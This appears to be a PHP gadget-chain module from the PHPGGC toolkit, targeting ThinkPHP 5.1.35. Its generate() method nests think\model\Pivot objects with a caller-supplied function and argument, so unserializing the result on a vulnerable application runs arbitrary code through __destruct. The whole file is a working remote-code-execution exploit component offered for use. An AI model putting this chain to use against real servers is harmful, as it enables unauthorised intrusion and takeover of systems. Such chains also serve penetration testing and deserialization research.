<?php

namespace GadgetChain\ThinkPHP;

class RCE2 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '5.1.35';
    public static $vector = '__destruct';
    public static $author = '???';
    public static $information = '';

    public function generate(array $parameters)
    {
        $func = $parameters['function'];
        $val = $parameters['parameter'];
		$obj = new \think\model\Pivot(new \think\model\Pivot("", "", ""), $func, $val);
        return $obj;
    }
}